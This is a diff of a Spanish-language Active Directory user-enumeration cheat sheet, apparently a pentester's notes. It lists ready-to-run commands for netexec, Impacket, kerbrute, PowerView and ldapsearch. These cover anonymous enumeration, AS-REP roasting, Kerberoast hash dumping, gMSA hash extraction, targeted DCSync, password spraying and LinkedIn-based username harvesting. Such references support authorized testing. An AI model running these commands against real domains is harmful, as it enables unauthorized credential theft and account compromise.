@@ -22,308 +22,203 @@ linked:
 
 ***
 
-## netexec / crackmapexec
+## netexec
 
-| **Función** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| LDAP user dump | `nxc ldap DC -u u -p p --users` | Full attribute set. |
-| SMB SAMR enum | `nxc smb DC -u u -p p --users` | RID brute SAMR. |
-| Anonymous attempt | `nxc smb DC -u '' -p '' --users` | Null check. |
-| Custom LDAP filter | `nxc ldap DC --query "(filter)" "attrs"` | Targeted. |
-| AS-REP roastable | `nxc ldap DC -u u -p p --asreproastable` | Filter. |
-| Kerberoast targets | `nxc ldap DC -u u -p p --kerberoasting kerb.txt` | Filter + dump. |
-| Admin count | `nxc ldap DC -u u -p p --admin-count` | Tier 0 filter. |
-| Password not required | `nxc ldap DC -u u -p p --password-not-required` | Vuln. |
-| Active users | `nxc ldap DC -u u -p p --active-users` | Enabled filter. |
-| Trusted for delegation | `nxc ldap DC -u u -p p --trusted-for-delegation` | Critical. |
-| RID brute | `nxc smb DC -u u -p p --rid-brute 10000` | Range. |
-| LAPS-readable | `nxc smb hosts -u u -p p --laps` | Adjacent. |
-| gMSA dump | `nxc ldap DC -u u -p p --gmsa` | Adjacent. |
-| Output to file | `--users-export users.txt` | Standard. |
-| Multi-DC | `nxc smb dcs.txt -u u -p p --users` | Bulk. |
-| Spray prep | Combine filters → spray candidates | Workflow. |
+| `nxc ldap <DC> -u u -p p --users` | Users LDAP | Standard. |
+| `nxc smb <DC> -u u -p p --users` | Users SAMR | Alt path. |
+| `nxc smb <DC> -u '' -p '' --users` | Anonymous attempt | Misconfig hunt. |
+| `nxc ldap <DC> -u u -p p --asreproastable` | AS-REP roastable | Pre-attack. |
+| `nxc ldap <DC> -u u -p p --kerberoasting kerb.hash` | Kerberoast bulk dump | Pre-attack. |
+| `nxc ldap <DC> -u u -p p --admin-count` | adminCount=1 (Tier 0) | Priv enum. |
+| `nxc ldap <DC> -u u -p p --password-not-required` | PASSWD_NOTREQD users | Vuln signal. |
+| `nxc ldap <DC> -u u -p p --trusted-for-delegation` | UD users + computers | Critical. |
+| `nxc ldap <DC> -u u -p p --gmsa` | gMSA accounts + hashes | Cred path. |
+| `nxc smb <DC> -u u -p p --rid-brute 10000` | RID brute extendido | Domain grande. |
+| `nxc ldap <DC> -u u -p p --query "(filter)" "attrs"` | Custom LDAP query | Targeted. |
 ^ad-tool-netexec-users
 
-### Comprehensive netexec recon
-
 ```bash
-DC="dc01.dom.local"
-USER="user"
-PASS="pass"
+# Pipeline post-foothold
+DC=10.10.10.10
+USER=auditor; PASS='Pass!'
 
-# Bulk dumps
 nxc ldap $DC -u $USER -p $PASS --users > users_ldap.txt
-nxc smb $DC -u $USER -p $PASS --rid-brute 10000 > users_rid.txt
 nxc ldap $DC -u $USER -p $PASS --asreproastable > asrep.txt
-nxc ldap $DC -u $USER -p $PASS --kerberoasting kerb.txt
+nxc ldap $DC -u $USER -p $PASS --kerberoasting kerb.hash
 nxc ldap $DC -u $USER -p $PASS --admin-count > admins.txt
-nxc ldap $DC -u $USER -p $PASS --password-not-required > vuln_users.txt
-nxc ldap $DC -u $USER -p $PASS --trusted-for-delegation > delegation.txt
-
-# Anonymous attempts
-nxc smb $DC -u '' -p '' --users 2>&1 | tee users_anon.txt
-nxc smb $DC -u '' -p '' --rid-brute 10000 2>&1 | tee users_anon_rid.txt
+nxc ldap $DC -u $USER -p $PASS --password-not-required > vuln.txt
+nxc ldap $DC -u $USER -p $PASS --trusted-for-delegation > deleg.txt
 ```
 
 ___
 
-## Impacket Toolkit
+## Impacket
 
-| **Tool** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| GetADUsers | `impacket-GetADUsers -all dom/u:p` | Full list + LastLogon. |
-| GetADUsers CSV | `impacket-GetADUsers -all dom/u:p -outputfile users.csv` | Reportable. |
-| samrdump | `impacket-samrdump dom/u:p@DC` | SAMR detail. |
-| samrdump anonymous | `impacket-samrdump 'dom/'@DC` | Null. |
-| lookupsid | `impacket-lookupsid 'dom/u:p'@DC 10000` | RID brute SAMR. |
-| lookupsid anonymous | `impacket-lookupsid 'dom/'@DC 10000` | Null. |
-| GetUserSPNs | `impacket-GetUserSPNs dom/u:p -request` | Kerberoast. |
-| GetNPUsers | `impacket-GetNPUsers dom/ -usersfile u.txt -no-pass` | AS-REP. |
-| secretsdump (privileged) | `impacket-secretsdump dom/admin:pass@DC -just-dc-user user` | Single user. |
-| psexec / wmiexec / smbexec | Adjacent | Standard. |
-| rpcdump | `impacket-rpcdump @DC` | RPC interface enum. |
-| getTGT.py | `impacket-getTGT dom/u:p` | Get TGT (auth). |
-| ticketer.py | Forge tickets | Adjacent. |
-| Kerberos auth (-k -no-pass) | KRB5CCNAME env var | Modern. |
-| NTLM hash auth | `-hashes :NT_HASH` | Pass-the-Hash. |
-| AES key auth | `-aesKey AES_KEY` | Adjacent. |
+| `impacket-GetADUsers -all corp.local/u:p -dc-ip <DC> -outputfile users.csv` | Users + LastLogon CSV | Reportable. |
+| `impacket-GetADUsers -all corp.local/u:p -dc-ip <DC> -k -no-pass` | Auth Kerberos | OPSEC sin password. |
+| `impacket-samrdump corp.local/u:p@<DC>` | SAMR detallado | Más info que GetADUsers. |
+| `impacket-samrdump 'corp.local/'@<DC>` | Anonymous SAMR | Si null. |
+| `impacket-lookupsid 'corp.local/u:p'@<DC> 10000` | RID brute LSARPC | Authenticated brute. |
+| `impacket-lookupsid 'corp.local/'@<DC>` | Anonymous lookupsid | Null check. |
+| `impacket-GetUserSPNs corp.local/u:p -dc-ip <DC> -request` | Kerberoast bulk | Pre-attack. |
+| `impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip <DC>` | AS-REP sin auth | Targeted. |
+| `impacket-secretsdump corp.local/admin:pass@<DC> -just-dc-user <victim>` | Single user hash (priv) | Targeted DCSync. |
 ^ad-tool-impacket-users
 
-### Impacket workflow
-
 ```bash
-# Detailed user dump
-impacket-GetADUsers -all dom.local/user:pass -dc-ip DC -outputfile users.csv
-
-# RID brute (when null sessions allowed)
-impacket-lookupsid 'dom.local/'@DC 10000 | grep "SidTypeUser"
-
-# Authenticated RID brute (more reliable)
-impacket-lookupsid 'dom.local/user:pass'@DC 10000 | \
-  grep "SidTypeUser" | awk '{print $2}' | cut -d'\' -f2 > users.txt
-
-# AS-REP without auth (validate users + roast)
-impacket-GetNPUsers dom.local/ -usersfile users.txt -no-pass
-
-# Kerberoast (auth required)
-impacket-GetUserSPNs dom.local/user:pass -request -outputfile kerb.hashes
+# Authenticated RID brute (más confiable que --rid-brute)
+impacket-lookupsid 'corp.local/auditor:Pass!'@<DC> 10000 |
+  grep "SidTypeUser" |
+  awk '{print $2}' |
+  cut -d'\\' -f2 > users.txt
 ```
 
 ___
 
 ## kerbrute
 
-| **Función** | **Comando** | **Notas** |
+| **Comando** | **Qué hace** | **Cuándo** |
 |:---:|:---:|:---:|
-| Userenum | `kerbrute userenum -d dom.local users.txt` | Validate via Kerberos. |
-| Userenum specific DC | `kerbrute userenum --dc DC -d dom.local users.txt` | Direct. |
-| Output file | `-o results.txt` | Standard. |
-| Threads | `-t 100` | Performance. |
-| Domain via DNS | Auto-detect SRV | Standard. |
-| Downgrade encryption | `--downgrade` | Edge. |
-| Password spray | `kerbrute passwordspray -d dom.local users.txt 'pass'` | Adjacent. |
-| Brute single user | `kerbrute bruteuser -d dom.local pass.txt user` | Adjacent. |
-| BruteForce | `kerbrute bruteforce -d dom.local creds.txt` | Adjacent. |
-| Verbose | `-v` | Debug. |
-| Quiet | `-q` | Less output. |
-| Timeout | `--timeout 5` | Adjusting. |
-| Sleep between attempts | Built-in throttling | OPSEC. |
-| Pre-auth based | KDC response codes | Detection. |
-| No lockout for userenum | KDC doesn't lock | Safe. |
-| Detection: bulk Event 4768 | Defender SIEM | Adjacent. |
+| `kerbrute userenum --dc <DC> -d corp.local users.txt` | Validar users via Kerberos | Sin creds. |
+| `kerbrute userenum --dc <DC> -d corp.local users.txt -o valid.txt -t 100` | Output + threads | Pipeline. |
+| `kerbrute passwordspray --dc <DC> -d corp.local users.txt 'Spring2026!'` | Spray post-validation | Adjacent. |
+| `kerbrute bruteuser --dc <DC> -d corp.local pass.txt <user>` | Brute single user | Edge. |
+| `kerbrute bruteforce --dc <DC> -d corp.local creds.txt` | user:pass list | Edge. |
 ^ad-tool-kerbrute
 
-### kerbrute usage
+**Por qué OPSEC-friendly:** AS-REQ no incrementa `BadPasswordCount`. No triggers lockout en userenum (solo en bruteforce/spray).
 
 ```bash
-# Install
+# Install + use
 go install github.com/ropnop/kerbrute@latest
-
-# Or download binary from releases
+# o binary release directo
 wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
 chmod +x kerbrute_linux_amd64
 
-# Userenum
-./kerbrute_linux_amd64 userenum --dc DC -d dom.local usernames.txt -o valid.txt -t 100
-
-# Output:
-# [+] VALID USERNAME: jsmith@dom.local
-# [+] VALID USERNAME: alice@dom.local
-# [+] VALID USERNAME: admin@dom.local
+# Pipeline
+./kerbrute_linux_amd64 userenum --dc <DC> -d corp.local usernames.txt -o valid.txt -t 100
 ```
 
 ___
 
 ## PowerView / pywerview
 
-| **Función** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Get-DomainUser | All users | Standard. |
-| Get-DomainUser -SPN | SPN-bound | Kerberoast prep. |
-| Get-DomainUser -PreauthNotRequired | AS-REP roastable | Filter. |
-| Get-DomainUser -AdminCount | adminCount=1 | Privileged. |
-| Get-DomainUser -AllowDelegation | Delegation users | Critical. |
-| Get-DomainUser -TrustedToAuth | Constrained delegation | Privileged. |
-| Get-DomainUser -Identity user | Single user detail | Standard. |
-| Get-DomainUser -LDAPFilter "..." | Custom filter | Flexible. |
-| Get-DomainObjectAcl -SamAccountName user | Per-user ACL | ACL audit. |
-| Find-LocalAdminAccess | Per-host admin enum | Lateral. |
-| Find-DomainShare | Share recon | Adjacent. |
-| Find-DomainUserLocation | User session location | Targeting. |
-| Find-DomainProcess | Process per user | Targeting. |
-| Find-InterestingDomainAcl | Dangerous ACEs | Privesc. |
-| pywerview equivalent | Linux | Adjacent. |
-| `Get-DomainUserEvent` | Logon events (4624 etc) | Defender adjacent. |
+| `Get-DomainUser` | Todos users | Standard. |
+| `Get-DomainUser -SPN` | Kerberoastables | Pre-attack. |
+| `Get-DomainUser -PreauthNotRequired` | AS-REP roastables | Pre-attack. |
+| `Get-DomainUser -AdminCount` | adminCount=1 | Priv enum. |
+| `Get-DomainUser -AllowDelegation` | UD + constrained | Critical. |
+| `Get-DomainUser -TrustedToAuth` | Constrained con protocol transition | S4U. |
+| `Get-DomainUser -Identity <user>` | Per-user detail | Targeted. |
+| `Get-DomainUser -LDAPFilter "(description=*pass*)"` | Custom filter | Cred hunt. |
+| `Find-DomainUserLocation -UserIdentity <user>` | Sessions del user | Targeted hunt. |
+| `Find-LocalAdminAccess` | Hosts donde sos local admin | Lateral. |
+| `pywerview get-netuser -u u -p p -d corp.local --dc-ip <DC>` | Linux equivalent | Sin Windows. |
+| `pywerview get-netuser ... --spn` | Kerberoastables Linux | Linux. |
 ^ad-tool-powerview-users
 
-### PowerView user recon
-
 ```powershell
-# Comprehensive user detail
+# Pipeline PowerView
+Import-Module .\PowerView.ps1
+
 Get-DomainUser -SPN | Select Name,SamAccountName,@{n='SPNs';e={$_.serviceprincipalname -join '; '}}
-
-# AS-REP roastable
 Get-DomainUser -PreauthNotRequired
-
-# Privileged
 Get-DomainUser -AdminCount
-
-# Custom LDAP filter (description leak)
-Get-DomainUser -LDAPFilter "(description=*pass*)" |
-  Select Name,Description
-
-# Find user location (where logged on)
-Find-DomainUserLocation -UserIdentity "target_user"
-
-# Linux pywerview
-pywerview get-netuser -u user -p pass -d dom.local --dc-ip DC
-pywerview get-netuser -u user -p pass -d dom.local --spn  # Kerberoast prep
+Get-DomainUser -AllowDelegation
+Find-DomainUserLocation -UserIdentity "Administrator"
 ```
 
 ___
 
 ## ldapsearch / Linux LDAP
 
-| **Función** | **Template** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Standard auth | `ldapsearch -h DC -D 'dom\u' -w pass -b DC=dom,DC=local` | Base. |
-| LDAPS | `-H ldaps://DC` | Encrypted. |
-| All users | `... "(objectCategory=user)" samAccountName` | Standard. |
-| User-only (no computers) | `... "(&(objectCategory=user)(!(objectClass=computer)))"` | Cleaner. |
-| Active accounts | `... "(samAccountType=805306368)" + UAC enabled bit` | Refined. |
-| AS-REP roastable | `userAccountControl:1.2.840.113556.1.4.803:=4194304` | Bitwise. |
-| Unconstrained delegation | `userAccountControl:...=524288` | Bitwise. |
-| Constrained delegation | `(msDS-AllowedToDelegateTo=*)` | Direct. |
-| GC port | `-p 3268` | Forest queries. |
-| Paged results | LDAP_PAGED_RESULT_OID auto | Auto. |
-| Output LDIF | Default | Standard. |
-| Specific attrs | `attr1 attr2` after filter | Reduce. |
-| Sort | `-S attr` | Edge. |
-| Binary attrs | `-t` | Edge. |
-| windapsearch wrapper | `python windapsearch.py` | Helper. |
-| ldap-monitor.py | `monitor changes` | Defender adjacent. |
+| `ldapsearch -h <DC> -D 'corp\u' -w pass -b DC=corp,DC=local "(filter)" attrs` | Auth + base + filter | Standard. |
+| `-H ldaps://<DC>` | LDAPS encrypted | OPSEC. |
+| `-Y GSSAPI` | Kerberos bind | Tras kinit. |
+| `-p 3268` | GC port (forest queries) | Cross-domain. |
+| `-E pr=1000/noprompt` | Paged results | Domain grande. |
+| `windapsearch.py -d corp.local -u u -p pass --dc-ip <DC> -m users` | Wrapper amigable | Sin filters complejos. |
+| `windapsearch.py ... -m all` | All modules (users + groups + computers + GPOs) | Comprehensive. |
+| `ldapdomaindump 'corp\u:p'@<DC> -o report/` | HTML + JSON + GREP report | Auditor-friendly. |
 ^ad-tool-ldapsearch-users
 
-### ldapsearch templates
-
 ```bash
-LDAP="ldapsearch -h DC -D 'dom\\user' -w pass -b DC=dom,DC=local"
+LS="ldapsearch -h <DC> -D 'corp\\u' -w pass -b DC=corp,DC=local"
 
-# Active normal accounts
-$LDAP "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=512))" \
-  samAccountName mail
+# Active normal accounts con email
+$LS "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=512))" samAccountName mail
 
 # AS-REP roastable
-$LDAP "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
-  samAccountName
+$LS "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" samAccountName
 
 # Kerberoastable
-$LDAP "(&(objectCategory=user)(servicePrincipalName=*))" \
-  samAccountName servicePrincipalName
+$LS "(&(objectCategory=user)(servicePrincipalName=*))" samAccountName servicePrincipalName
 
 # Unconstrained delegation
-$LDAP "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
-  samAccountName
+$LS "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))" samAccountName
 
-# Description with potential password
-$LDAP "(&(objectCategory=user)(|(description=*pass*)(description=*Pass*)(description=*PWD*)))" \
-  samAccountName description
+# Cred leak en description
+$LS "(&(objectCategory=user)(|(description=*pass*)(description=*pwd*)))" samAccountName description
 
-# Forest GC query (cross-domain users)
-ldapsearch -h DC -p 3268 -D 'dom\user' -w pass -b "" \
-  "(objectCategory=user)" samAccountName
+# Forest-wide via GC
+ldapsearch -h <DC> -p 3268 -D 'corp\\u' -w pass -b "" "(objectCategory=user)" samAccountName
 ```
 
 ___
 
 ## linkedin2username / Wordlist Generators
 
-| **Tool** | **Use** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| linkedin2username | LinkedIn employee → username candidates | OSINT. |
-| username-anarchy | Names → permutations | Standard. |
-| cupp | Personal info → password candidates | Adjacent (passwords). |
-| crunch | Char-set generator | Edge. |
-| Wordlister | Combinator | Adjacent. |
-| Mentalist | GUI wordlist builder | Edge. |
-| theHarvester | OSINT email/host enum | Email patterns. |
-| OSINT-SPY | Comprehensive | Edge. |
-| Maltego | Visual OSINT | Edge enterprise. |
-| Hunter.io | Email pattern API | Commercial. |
-| Snov.io | Email finder | Commercial. |
-| `gixxer` SecLists | Domain-specific | Adjacent. |
-| `cewl` company website crawl | Wordlist from site | Adjacent. |
-| Custom Bash generator | Flexible | DIY. |
-| GitHub email leaks (`gitleaks`) | Code repo emails | OSINT. |
-| Wayback Machine | Historical staff | OSINT. |
+| `python3 linkedin2username.py -c "Target Co" -u u -p p -n corp.local` | Usernames generados desde LinkedIn employees | OSINT pre-engagement. |
+| `./username-anarchy -i names.txt > usernames.txt` | Permutations desde "First Last" | Standard. |
+| `cewl https://corp.com -d 2 -m 5 -w companywords.txt` | Wordlist desde sitio público | Naming patterns. |
+| `theHarvester -d corp.com -b google,bing,linkedin` | Multi-source emails + names | OSINT. |
+| `h8mail -t target@corp.com` | Breach DB lookup | Pwned creds históricos. |
+| `gitleaks detect --source <repo>` | Secrets en repos públicos | Code OSINT. |
 ^ad-tool-wordlists-users
 
-### linkedin2username + kerbrute pipeline
-
 ```bash
-# 1. Generate username candidates from LinkedIn
+# Pipeline OSINT → AD validation
 git clone https://github.com/initstring/linkedin2username
-cd linkedin2username
-python3 linkedin2username.py -c "Target Company" -u atacante -p pass -n dom.local
+python3 linkedin2username.py -c "Target Company" -u atacante -p pass -n corp.local
 
-# Outputs multiple files:
-# - first.last.txt
-# - first_last.txt
-# - flast.txt
-# - firstl.txt
-
-# 2. Combine and dedupe
+# Combine outputs + dedupe
 cat *.txt | sort -u > all_users.txt
 
-# 3. Validate via Kerberos (no auth needed)
-kerbrute userenum --dc DC -d dom.local all_users.txt -o valid.txt
+# Validate
+kerbrute userenum --dc <DC> -d corp.local all_users.txt -o valid.txt
 
-# 4. Optional: spray
-kerbrute passwordspray --dc DC -d dom.local valid.txt 'Spring2026!'
+# Spray opcional post-validation
+kerbrute passwordspray --dc <DC> -d corp.local valid.txt 'Spring2026!'
 ```
 
 ___
 
-## Wordlists & Resources
+## Recursos
 
-| **Recurso** | **Path / URL** | **Notas** |
-|:---:|:---:|:---:|
-| SecLists Usernames | `seclists/Usernames/` | Curated. |
-| `Names/names.txt` | First names (50K+) | Foundation. |
-| `Names/familynames-usa-top1000.txt` | Surnames | Adjacent. |
-| `cirt-default-usernames.txt` | Vendor defaults | Adjacent. |
-| `top-usernames-shortlist.txt` | Top 100 common | Quick. |
-| HackTricks AD User Enum | `book.hacktricks.xyz` | Reference. |
-| The Hacker Recipes - User Enum | `thehacker.recipes/ad/recon` | Comprehensive. |
-| Username generators (custom Bash) | DIY | Standard. |
-| Mining LinkedIn alternatives | OSINT-SPY, theHarvester | Adjacent. |
-| Public breach databases | dehashed.com, HIBP | OSINT. |
-| Reverse DNS for hostnames | `dig -x` | Adjacent. |
-| Email pattern guess (Hunter.io) | Commercial | Adjacent. |
-| MITRE ATT&CK Account Discovery | T1087 | Framework. |
-| BloodHound | Visual user analytics | Tool. |
-| Microsoft Defender for Identity | Anomaly detection | Defender. |
-| `awesome-active-directory` | Curated | Foundation. |
+| **Recurso** | **URL** |
+|:---:|:---:|
+| SecLists Usernames | `/usr/share/seclists/Usernames/` |
+| `Names/names.txt` (50K+ first names) | SecLists |
+| `Names/familynames-usa-top1000.txt` | SecLists |
+| `cirt-default-usernames.txt` | Vendor defaults |
+| HackTricks AD Methodology | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology` |
+| The Hacker Recipes — Recon | `https://www.thehacker.recipes/ad/recon` |
+| MITRE ATT&CK T1087 | `https://attack.mitre.org/techniques/T1087/` |
+| `awesome-active-directory` | `https://github.com/Orange-Cyberdefense/awesome-activedirectory` |
+| netexec docs | `https://www.netexec.wiki` |
+| Impacket | `https://github.com/fortra/impacket` |
+| kerbrute | `https://github.com/ropnop/kerbrute` |
+| linkedin2username | `https://github.com/initstring/linkedin2username` |
 ^ad-tool-resources-users
 
 ***
